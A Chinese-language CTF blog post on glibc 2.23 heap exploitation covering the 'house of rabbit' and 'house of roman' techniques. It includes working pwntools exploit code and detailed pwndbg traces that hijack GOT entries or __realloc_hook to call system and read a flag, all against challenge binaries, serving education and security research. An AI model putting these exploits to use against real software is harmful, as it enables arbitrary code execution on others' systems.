---
layout: post
title: 【pwn4heap】glibc2.23其四
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# 【pwn4heap】glibc2.23其四

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-18 house of rabbit

本方法利用glibc对于malloc_consolidate管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4165)

```c
/*
  If max_fast is 0, we know that av hasn't
  yet been initialized, in which case do so below
*/

if (get_max_fast () != 0) {
  clear_fastchunks(av);

  unsorted_bin = unsorted_chunks(av);

  /*
    Remove each chunk from fast bin and consolidate it, placing it
    then in unsorted bin. Among other reasons for doing this,
    placing in unsorted bin avoids needing to calculate actual bins
    until malloc is sure that chunks aren't immediately going to be
    reused anyway.
  */

  maxfb = &fastbin (av, NFASTBINS - 1);
  fb = &fastbin (av, 0);
  do {
    p = atomic_exchange_acq (fb, 0);
    if (p != 0) {
	do {
	  check_inuse_chunk(av, p);
	  nextp = p->fd; <= bug

	  /* Slightly streamlined version of consolidation code in free() */
	  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
	  nextchunk = chunk_at_offset(p, size);
	  nextsize = chunksize(nextchunk);

	  if (!prev_inuse(p)) {
	    prevsize = p->prev_size;
	    size += prevsize;
	    p = chunk_at_offset(p, -((long) prevsize));
	    unlink(av, p, bck, fwd);
	  }

	  if (nextchunk != av->top) {
	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

	    if (!nextinuse) {
	      size += nextsize;
	      unlink(av, nextchunk, bck, fwd);
	    } else
	      clear_inuse_bit_at_offset(nextchunk, 0);

	    first_unsorted = unsorted_bin->fd;
	    unsorted_bin->fd = p;
	    first_unsorted->bk = p;

	    if (!in_smallbin_range (size)) {
	      p->fd_nextsize = NULL;
	      p->bk_nextsize = NULL;
	    }

	    set_head(p, size | PREV_INUSE);
	    p->bk = unsorted_bin;
	    p->fd = first_unsorted;
	    set_foot(p, size);
	  }

	  else {
	    size += nextsize;
	    set_head(p, size | PREV_INUSE);
	    av->top = p;
	  }

	} while ( (p = nextp) != 0);

    }
  } while (fb++ != maxfb);
}
else {
  malloc_init_state(av);
  check_malloc_state(av);
}
```

在glibc 2.23版本中，malloc_consolidate的合并路径存在验证机制缺陷，具体表现为基本上未对p->fd做任何限制。通过精心构造的p->fd，致使nextp转移到unsorted bin里，从而实现任意地址操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/10/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_rabbit/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# house of rabbit
malloc(0, 0xA00000, b"A" * 0x8)
delete(0)
malloc(0, 0xA00000, b"A" * 0x8)
delete(0)
malloc(1, 0x10, b"B" * 0x8)
malloc(2, 0x80, b"C" * 0x8)
delete(1)
payload = p64(0) + p64(0x11) + p64(0) + p64(0xFFFFFFFFFFFFFFF1)
change_profile(p64(0), payload)
edit(1, 0x8, p64(0x004040E0 + 0x10))
delete(2)
payload = p64(0xFFFFFFFFFFFFFFF0) + p64(0x10) + p64(0) + p64(0xA00001)
change_profile(p64(0), payload)
malloc(3, 0xA00000, b"D" * 0x8)
payload = p64(0xFFFFFFFFFFFFFFF0) + p64(0x10) + p64(0) + p64(0xFFFFFFFFFFFFFFF1)
change_profile(p64(0), payload)
evil_size = 0x00404120 - (0x004040E0 + 0x10) - 0x20
malloc(4, evil_size, p64(0))
payload = b"\x00" * 0x30 + p64(0) + p64(0x30)
change_profile(p64(0), payload)
malloc(5, 0x28, b"F" * 0x8)

# unsorted bin leak
author_name, introduction, content = show(5)
main_arena88 = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# final exploit
payload = p64(0x20) + p64(0x00404000)
payload += p64(0x20) + p64(binsh_addr)
edit(5, len(payload), payload)
edit(0, 0x8, p64(libc.sym["system"]))
delete(1)
cmd = b"cat src/2.23/house_of_rabbit/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

通过连续两次执行分配与释放指定大小的内存块操作，可以有效扩展main_arena结构体中system_mem字段的数值。具体而言，每次操作包括分配一个大小为0xA00000字节的内存块，并随后立即释放该内存块。重复此过程两次，旨在实现对内存分配器内部状态的调整，以增大system_mem的计数。

```bash
pwndbg> p/x main_arena->system_mem
$1 = 0xa21000
pwndbg> 
```

在glibc的ptmalloc2分配器中，刻意增大main_arena->system_mem值的主要目的，是为了在合并非 mmap内存块时，绕过一项关键的完整性验证。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3993)

```c
nextsize = chunksize(nextchunk);
if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))  <= check
  {
	errstr = "free(): invalid next size (normal)";
	goto errout;
  }
```

完成增大main_arena->system_mem值之后，准备制作出来fast bin。

```bash
pwndbg> fastbins 
fastbins
0x20: 0xfec7000 ◂— 0
pwndbg> 
```

接着准备伪造fake chunk1和fake chunk2，使得fake chunk1->prev = fake chunk2，fake chunk2->next = fake chunk1。

```bash
pwndbg> x/8gx profile.introduction 
0x4040e0 <profile+32>:  0x0000000000000000      0x0000000000000011  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0xfffffffffffffff1  <= fake chunk2
0x404100 <profile+64>:  0x0000000000000000      0x0000000000000000
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
pwndbg> 
```

修改fastbins里0xfec7000的fd为fake chunk2。

```bash
pwndbg> fastbins 
fastbins
0x20: 0xfec7000 —▸ 0x4040f0 (profile+48) ◂— 0
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0xfec7000
Size: 0x20 (with flag bits: 0x21)
fd: 0x4040f0

Allocated chunk | PREV_INUSE
Addr: 0xfec7020
Size: 0x90 (with flag bits: 0x91)

Top chunk | PREV_INUSE
Addr: 0xfec70b0
Size: 0xa20f50 (with flag bits: 0xa20f51)

pwndbg> 
```

接着释放chunks[2](0xfec7020)，由于chunks[2]与top-chunk相邻，按照free相关规则，chunks[2]将会合并到top-chunk里。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3886
   3880 
   3881   /*
   3882     If eligible, place chunk on a fastbin so it can be found
   3883     and used quickly in malloc.
   3884   */
   3885 
 ► 3886   if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
 
pwndbg> p/x size
$2 = 0x90
```

由于chunks[2]->size大于get_max_fast，进入else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3961
   3955   }
   3956 
   3957   /*
   3958     Consolidate other non-mmapped chunks as they arrive.
   3959   */
   3960 
 ► 3961   else if (!chunk_is_mmapped(p)) {
   3962     if (! have_lock) {
   3963       (void)mutex_lock(&av->mutex);
   3964       locked = 1;
   3965     }
   3966 
   3967     nextchunk = chunk_at_offset(p, size);
```

接着遇到关于av->system_mem的关键校验。由于最开始增加了av->system_mem的尺寸，顺利通过这个校验。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3993
   3987         errstr = "double free or corruption (!prev)";
   3988         goto errout;
   3989       }
   3990 
   3991     nextsize = chunksize(nextchunk);
   3992     if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
 ► 3993         || __builtin_expect (nextsize >= av->system_mem, 0))
   3994       {
   3995         errstr = "free(): invalid next size (normal)";
   3996         goto errout;
   3997       }
   
pwndbg> p/x nextsize
$3 = 0xa20f50
pwndbg> p/x av->system_mem
$4 = 0xa21000
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0xfec70b0
Size: 0xa20f50 (with flag bits: 0xa20f51)

pwndbg>
```

然后，开始准备进入malloc_consolidate函数，即将整理fast bin里的chunk。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4074
   4068       has been reached unless fastbins are consolidated.  But we
   4069       don't want to consolidate on each free.  As a compromise,
   4070       consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
   4071       is reached.
   4072     */
   4073 
 ► 4074     if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
   4075       if (have_fastchunks(av))
   4076         malloc_consolidate(av);
```

首先，进入一个0x48次的大循环。依次整理每个fast bin的槽位。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4161
   4155       reused anyway.
   4156     */
   4157 
   4158     maxfb = &fastbin (av, NFASTBINS - 1);
   4159     fb = &fastbin (av, 0);
   4160     do {
 ► 4161       p = atomic_exchange_acq (fb, 0);
   4162       if (p != 0) {
   4163         do {
   4164           check_inuse_chunk(av, p);
   4165           nextp = p->fd;
   
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4165
   4159     fb = &fastbin (av, 0);
   4160     do {
   4161       p = atomic_exchange_acq (fb, 0);
   4162       if (p != 0) {
   4163         do {
   4164           check_inuse_chunk(av, p);
 ► 4165           nextp = p->fd;
 
pwndbg> p/x p
$8 = 0xfec7000
pwndbg> p/x p->fd
$9 = 0x4040f0
pwndbg> 
```

可以发现0x4040f0即为伪造的fake chunk2。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4179
   4173             prevsize = p->prev_size;
   4174             size += prevsize;
   4175             p = chunk_at_offset(p, -((long) prevsize));
   4176             unlink(av, p, bck, fwd);
   4177           }
   4178 
 ► 4179           if (nextchunk != av->top) {
 
pwndbg> p/x nextchunk
$12 = 0xfec7020
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0xfec7020
Size: 0xa20fe0 (with flag bits: 0xa20fe1)

pwndbg> 
```

由于nextchunk就是top-chunk，进入else分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4206
   4200             set_foot(p, size);
   4201           }
   4202 
   4203           else {
   4204             size += nextsize;
   4205             set_head(p, size | PREV_INUSE);
 ► 4206             av->top = p;
   4207           }
   4208 
   4209         } while ( (p = nextp) != 0);
   4210 
   4211       }
   4212     } while (fb++ != maxfb);

pwndbg> p/x nextp
$13 = 0x4040f0
pwndbg> 
```

于是，将p与top-chunk合并。接着，进入第二轮循环。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4165
   4159     fb = &fastbin (av, 0);
   4160     do {
   4161       p = atomic_exchange_acq (fb, 0);
   4162       if (p != 0) {
   4163         do {
   4164           check_inuse_chunk(av, p);
 ► 4165           nextp = p->fd;
 
pwndbg> p/x p
$14 = 0x4040f0
pwndbg> p/x p->fd
$15 = 0x0

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4172
   4166 
   4167           /* Slightly streamlined version of consolidation code in free() */
   4168           size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
   4169           nextchunk = chunk_at_offset(p, size);
   4170           nextsize = chunksize(nextchunk);
   4171 
 ► 4172           if (!prev_inuse(p)) {
 
pwndbg> p/x size
$16 = 0xfffffffffffffff0
pwndbg> p/x nextchunk
$17 = 0x4040e0
pwndbg> p/x nextsize
$18 = 0x10
pwndbg> x/4gx 0x4040e0
0x4040e0 <profile+32>:  0x0000000000000000      0x0000000000000011  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0xfffffffffffffff1  <= fake chunk2
pwndbg> 
```

这里可直观的看到fake chunk2->next = fake chunk1。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4179
   4173             prevsize = p->prev_size;
   4174             size += prevsize;
   4175             p = chunk_at_offset(p, -((long) prevsize));
   4176             unlink(av, p, bck, fwd);
   4177           }
   4178 
 ► 4179           if (nextchunk != av->top) {
   4180             nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
 
pwndbg> p/x nextchunk
$20 = 0x4040e0
pwndbg> top-chunk 
Top chunk | PREV_INUSE
Addr: 0xfec7000
Size: 0xa21000 (with flag bits: 0xa21001)

pwndbg> 
```

由于nextchunk不等于top-chunk，进入该分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4188
   4182             if (!nextinuse) {
   4183               size += nextsize;
   4184               unlink(av, nextchunk, bck, fwd);
   4185             } else
   4186               clear_inuse_bit_at_offset(nextchunk, 0);
   4187 
 ► 4188             first_unsorted = unsorted_bin->fd;
   4189             unsorted_bin->fd = p;
   4190             first_unsorted->bk = p;
   4191 
   4192             if (!in_smallbin_range (size)) {
   4193               p->fd_nextsize = NULL;
   4194               p->bk_nextsize = NULL;
   4195             }
   4196 
   4197             set_head(p, size | PREV_INUSE);
   4198             p->bk = unsorted_bin;
   4199             p->fd = first_unsorted;
   4200             set_foot(p, size);
```

可以明显看出来fake chunk2即将进入unsorted bin里。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4209
   4203           else {
   4204             size += nextsize;
   4205             set_head(p, size | PREV_INUSE);
   4206             av->top = p;
   4207           }
   4208 
 ► 4209         } while ( (p = nextp) != 0);
   4210 
   4211       }
   4212     } while (fb++ != maxfb);
   
pwndbg> unsortedbin 
unsortedbin
all: 0x4040f0 (profile+48) —▸ 0x7bf40a58db78 (main_arena+88) ◂— 0x4040f0 (profile+48)
pwndbg> x/8gx profile.introduction 
0x4040e0 <profile+32>:  0xfffffffffffffff0      0x0000000000000010  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0xfffffffffffffff1  <= fake chunk2
0x404100 <profile+64>:  0x00007bf40a58db78      0x00007bf40a58db78
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
pwndbg> 
```

至此，实现了将指定地址送入unsorted bin。接着缩小fake chunk2->size至0xA00001。

```bash
pwndbg> x/8gx profile.introduction 
0x4040e0 <profile+32>:  0xfffffffffffffff0      0x0000000000000010  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0x0000000000a00001  <= fake chunk2
0x404100 <profile+64>:  0x00007bf40a58db78      0x00007bf40a58db78
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
pwndbg> unsortedbin 
unsortedbin
all: 0x4040f0 (profile+48) —▸ 0x7bf40a58db78 (main_arena+88) ◂— 0x4040f0 (profile+48)
pwndbg>
```

申请0xA00000大小的chunks[3]，将fake chunk2移至largebins。

```bash
pwndbg> largebins 
largebins
0x80000-∞: 0x4040f0 (profile+48) —▸ 0x7bf40a58e348 (main_arena+2088) ◂— 0x4040f0 (profile+48)
pwndbg> x/8gx profile.introduction 
0x4040e0 <profile+32>:  0xfffffffffffffff0      0x0000000000000010  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0x0000000000a00001  <= fake chunk2
0x404100 <profile+64>:  0x00007bf40a58e348      0x00007bf40a58e348
0x404110 <profile+80>:  0x00000000004040f0      0x00000000004040f0
pwndbg> 
```

此时，再将fake chunk2->size还原至0xfffffffffffffff1。

```bash
pwndbg> largebins 
largebins
0x80000-∞: 0x4040f0 (profile+48) —▸ 0x7bf40a58e348 (main_arena+2088) ◂— 0x4040f0 (profile+48)
pwndbg> x/8gx profile.introduction 
0x4040e0 <profile+32>:  0xfffffffffffffff0      0x0000000000000010  <= fake chunk1
0x4040f0 <profile+48>:  0x0000000000000000      0xfffffffffffffff1  <= fake chunk2
0x404100 <profile+64>:  0x00007bf40a58e348      0x00007bf40a58e348
0x404110 <profile+80>:  0x00000000004040f0      0x00000000004040f0
pwndbg> 
```

使用公式计算`evil_size = target - fake chunk2 - 0x20`作为此处的申请大小。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3368
   3362   /*
   3363      If the size qualifies as a fastbin, first check corresponding bin.
   3364      This code is safe to execute even if av is not yet initialized, so we
   3365      can try it without checking, which saves some time on this fast path.
   3366    */
   3367 
 ► 3368   if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
   3369     {
   
pwndbg> p/x nb
$23 = 0x20
```

此次申请大小位于fast bin，进入fast bin相关分支。由于fast bin此时并没有chunk可供用户使用，继续进入small bin相关逻辑分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3407
   3401      processed to find best fit. But for small ones, fits are exact
   3402      anyway, so we can check now, which is faster.)
   3403    */
   3404 
   3405   if (in_smallbin_range (nb))
   3406     {
 ► 3407       idx = smallbin_index (nb);
   3408       bin = bin_at (av, idx);
```

同样的原因，继续进入unsorted bin相关逻辑分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3720
   3714               bin = next_bin (bin);
   3715               bit <<= 1;
   3716             }
   3717 
   3718           else
   3719             {
 ► 3720               size = chunksize (victim);
   3721 
   3722               /*  We know the first chunk in this bin is big enough to use. */
   3723               assert ((unsigned long) (size) >= (unsigned long) (nb));
   
pwndbg> p/x victim
$31 = 0x4040f0
pwndbg> p/x victim->size
$32 = 0xfffffffffffffff1
pwndbg> 
```

最终进入largebins相关分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3728
   3722               /*  We know the first chunk in this bin is big enough to use. */
   3723               assert ((unsigned long) (size) >= (unsigned long) (nb));
   3724 
   3725               remainder_size = size - nb;
   3726 
   3727               /* unlink */
 ► 3728               unlink (av, victim, bck, fwd);
 
pwndbg> largebins 
largebins
0x80000-∞: 0x4040f0 (profile+48) —▸ 0x7bf40a58e348 (main_arena+2088) ◂— 0x4040f0 (profile+48)
pwndbg> p/x victim
$33 = 0x4040f0
pwndbg> 
```

将victim从large bin里提取出来，并切割为两部分，一份放置unsorted bin，另一部分返回用户。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3758
   3752                   remainder->bk = bck;
   3753                   remainder->fd = fwd;
   3754                   bck->fd = remainder;
   3755                   fwd->bk = remainder;
   3756 
   3757                   /* advertise as last remainder */
 ► 3758                   if (in_smallbin_range (nb))
 
pwndbg> unsortedbin 
unsortedbin
all: 0x404110 (profile+80) —▸ 0x7bf40a58db78 (main_arena+88) ◂— 0x404110 (profile+80)
pwndbg> x/10gx chunks
0x404120 <chunks>:      0x00007bf40a58db78      0x00007bf40a58db78
0x404130 <chunks+16>:   0x0000000000000000      0x0000000000000000
0x404140 <chunks+32>:   0x0000000000000080      0x000000000fec7030
0x404150 <chunks+48>:   0x0000000000a00000      0x000000000fec7010
0x404160 <chunks+64>:   0x0000000000000010      0x0000000000404100
pwndbg> x/4gx 0x404110
0x404110 <profile+80>:  0x00000000004040f0      0xffffffffffffffd1
0x404120 <chunks>:      0x00007bf40a58db78      0x00007bf40a58db78
pwndbg> 
```

虽然chunks[4]已经获取.bss上的控制权，但是其size实在是太小，无法支持复杂操作。由于0x404110已经落入unsorted bin，只需再次申请即可。
为了避免出现访问违例内存错误，需要缩小0x404110的size为合适的值，

```bash
pwndbg> x/4gx 0x404110
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000030
0x404120 <chunks>:      0x00007bf40a58db78      0x00007bf40a58db78
pwndbg> unsortedbin 
unsortedbin
all: 0x404110 (profile+80) —▸ 0x7bf40a58db78 (main_arena+88) ◂— 0x404110 (profile+80)
pwndbg> 
```

最后，申请chunks[5]将0x404110从unsortedbin提取出来。这样不仅可以获取libc地址，也获取了.bss的控制权。


### 1-19 house of roman

本方法为fast bin attack和unsorted bin attack的组合技，二者核心原理参考[glibc2.23其一](https://binracer.github.io/2025/11/07/pwn4heap-glibc2.23%E5%85%B6%E4%B8%80/)，此处不在赘述。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/12/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_roman/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# house of roman
malloc(0, 0x60)  # fastbin_victim
malloc(1, 0x80)
malloc(2, 0x80)  # main_arena_use
malloc(3, 0x60)  # relative_offset_heap
delete(2)
malloc(4, 0x60)  # fake_libc_chunk
delete(3)
delete(0)
edit(0, b"\x00")
__realloc_hook_adjust = 0xE385
byte1 = (__realloc_hook_adjust) & 0xFF
byte2 = (__realloc_hook_adjust & 0xFF00) >> 8
edit(4, p8(byte1) + p8(byte2))
malloc(5, 0x60)
malloc(6, 0x60)
malloc(7, 0x60)  # realloc_hook_chunk
edit(5, b"/bin/sh\x00")
malloc(8, 0x80)  # unsorted_bin_ptr
malloc(9, 0x30)
delete(8)
__realloc_hook_adjust = 0xE3A8
byte1 = (__realloc_hook_adjust) & 0xFF
byte2 = (__realloc_hook_adjust & 0xFF00) >> 8
payload = p64(0) + p8(byte1) + p8(byte2)
edit(8, payload)
malloc(10, 0x80)
# b"\xeb\xc3\x{x}3", {x} need to brute force at least 0x10 times
payload = b"\x00" * (0x33 - 0x10) + b"\xeb\xc3\x03"
edit(7, payload)
# pwndbg> x/4gx 0x7714d858e3b8-0x10
# 0x7714d858e3a8 <main_arena+2184>:       0x0000000000000000      0x0000000000000000
# 0x7714d858e3b8 <__realloc_hook>:        0x00007714d803c3eb      0x00007714d8270c7b
# pwndbg>
conn.sendlineafter(b"> ", b"3")
conn.sendlineafter(b"Please input the chunk index: ", b"5")
conn.sendlineafter(b"Please input the size: ", str(0x20).encode())
try:
    cmd = b"cat src/2.23/house_of_roman/flag\x00"
    conn.sendline(cmd)
    flag = conn.recvline().decode().strip()
    log.success(f"flag: {format_flag(flag)}")
    conn.interactive()
except:
    conn.close()
```

首先申请chunks[0]、chunks[1]、chunks[2]、chunks[3]之后，heap内存结构布局如下：

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f100
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f190
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x5d3eb5f3f200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> 
```

然后，释放chunks[2]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5d3eb5f3f100 —▸ 0x7208ab98db78 (main_arena+88) ◂— 0x5d3eb5f3f100
pwndbg> 
```

接着申请chunks[4]大小内存，unsortedbin被切割两部分：一部分返回用户，一部分留在unsortedbin。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f100
Size: 0x70 (with flag bits: 0x71)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5d3eb5f3f170
Size: 0x20 (with flag bits: 0x21)
fd: 0x7208ab98db78
bk: 0x7208ab98db78

Allocated chunk
Addr: 0x5d3eb5f3f190
Size: 0x70 (with flag bits: 0x70)

Top chunk | PREV_INUSE
Addr: 0x5d3eb5f3f200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> unsortedbin 
unsortedbin
all: 0x5d3eb5f3f170 —▸ 0x7208ab98db78 (main_arena+88) ◂— 0x5d3eb5f3f170
pwndbg> x/4gx 0x5d3eb5f3f100
0x5d3eb5f3f100: 0x0000000000000000      0x0000000000000071
0x5d3eb5f3f110: 0x00007208ab98dbf8      0x00007208ab98dbf8
pwndbg> x/1gx 0x00007208ab98dbf8
0x7208ab98dbf8 <main_arena+216>:        0x00007208ab98dbe8
pwndbg> 
```

可以发现chunks[4]内保存着libc的地址。接着连续释放chunks[3]和chunks[0]用来制作fast bin。

```bash
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x5d3eb5f3f000
Size: 0x70 (with flag bits: 0x71)
fd: 0x5d3eb5f3f190

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x5d3eb5f3f100
Size: 0x70 (with flag bits: 0x71)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5d3eb5f3f170
Size: 0x20 (with flag bits: 0x21)
fd: 0x7208ab98db78
bk: 0x7208ab98db78

Free chunk (fastbins)
Addr: 0x5d3eb5f3f190
Size: 0x70 (with flag bits: 0x70)
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x5d3eb5f3f200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> fastbins 
fastbins
0x70: 0x5d3eb5f3f000 —▸ 0x5d3eb5f3f190 ◂— 0
pwndbg> 
```

此时，使用off-by-one技术，将0x5d3eb5f3f190修改为0x5d3eb5f3f100，而0x5d3eb5f3f100正好为chunks[4]控制的区域。

```bash
pwndbg> fastbins 
fastbins
0x70: 0x5d3eb5f3f000 —▸ 0x5d3eb5f3f100 —▸ 0x7208ab98dbf8 (main_arena+216) ◂— 0x7208ab98dbf8 (main_arena+216)
pwndbg> p/x chunks[4]
$1 = {
  size = 0x60,
  addr = 0x5d3eb5f3f110
}
pwndbg> 
```

此时fast bin由原来的两个chunk增加到三个chunk。而第三个chunk的位置可以通过chunks[4]来操作。

```bash
pwndbg> fastbins 
fastbins
0x70: 0x5d3eb5f3f000 —▸ 0x5d3eb5f3f100 —▸ 0x7208ab98e385 (main_arena+2149) ◂— 0x1000000
pwndbg> x/8gx 0x7208ab98e385
0x7208ab98e385 <main_arena+2149>:       0x08ab98db20000000      0x0000000000000072
0x7208ab98e395 <main_arena+2165>:       0x0000000001000000      0x0000021000000000
0x7208ab98e3a5 <main_arena+2181>:       0x0000021000000000      0x0000000000000000
0x7208ab98e3b5 <__malloc_hook+5>:       0x08ab670c31000000      0x08ab670c7b000072
pwndbg> p/x &__realloc_hook
$2 = 0x7208ab98e3b8
pwndbg> p/x 0x7208ab98e3b8-0x7208ab98e385
$3 = 0x33
pwndbg> 
```

通过__realloc_hook_adjust修正2个字节，使其正好位于__realloc_hook附近。只要连续申请三次，就可以获取__realloc_hook的控制权了。

```bash
pwndbg> fastbins 
fastbins
0x70: 0x1000000
pwndbg> x/16gx chunks
0x5d3e95d900c0 <chunks>:        0x0000000000000060      0x00005d3eb5f3f010
0x5d3e95d900d0 <chunks+16>:     0x0000000000000080      0x00005d3eb5f3f080
0x5d3e95d900e0 <chunks+32>:     0x0000000000000080      0x00005d3eb5f3f110
0x5d3e95d900f0 <chunks+48>:     0x0000000000000060      0x00005d3eb5f3f1a0
0x5d3e95d90100 <chunks+64>:     0x0000000000000060      0x00005d3eb5f3f110
0x5d3e95d90110 <chunks+80>:     0x0000000000000060      0x00005d3eb5f3f010
0x5d3e95d90120 <chunks+96>:     0x0000000000000060      0x00005d3eb5f3f110
0x5d3e95d90130 <chunks+112>:    0x0000000000000060      0x00007208ab98e395
pwndbg> 
```

在chunks[5]内布局`/bin/sh\x00`，为后续利用做好准备。接着申请chunks[8]和chunks[9]，然后释放chunks[8]用来制作unsorted bin。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5d3eb5f3f200 —▸ 0x7208ab98db78 (main_arena+88) ◂— 0x5d3eb5f3f200
pwndbg> p/x chunks[8]
$4 = {
  size = 0x80,
  addr = 0x5d3eb5f3f210
}
pwndbg> 
```

修改bk为__realloc_hook-0x10，利用unsorted bin attack技术，将__realloc_hook修改为libc的地址。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5d3eb5f3f200 ◂— 0
BK: 0x5d3eb5f3f200 —▸ 0x7208ab98e3a8 (main_arena+2184) —▸ 0x7208ab670c7b (memalign_hook_ini) ◂— ret 0x31
pwndbg> x/4gx 0x5d3eb5f3f200
0x5d3eb5f3f200: 0x0000000000000000      0x0000000000000091
0x5d3eb5f3f210: 0x0000000000000000      0x00007208ab98e3a8
pwndbg> x/4gx 0x7208ab98e3a8
0x7208ab98e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7208ab98e3b8 <__realloc_hook>:        0x00007208ab670c31      0x00007208ab670c7b
pwndbg> 
```

申请chunks[10]触发unsorted bin attack。

```bash
pwndbg> x/4gx 0x7208ab98e3a8
0x7208ab98e3a8 <main_arena+2184>:       0x0000000000021000      0x0000000000000000
0x7208ab98e3b8 <__realloc_hook>:        0x00007208ab98db78      0x00007208ab670c7b
pwndbg> p/x &system
$6 = 0x7208ab63c3eb
pwndbg> p/x chunks[7]
$8 = {
  size = 0x60,
  addr = 0x7208ab98e395
}
pwndbg> 
```

可以发现__realloc_hook成功修改为0x00007208ab98db78了。而libc的system与0x00007208ab98db78地址差值固定。
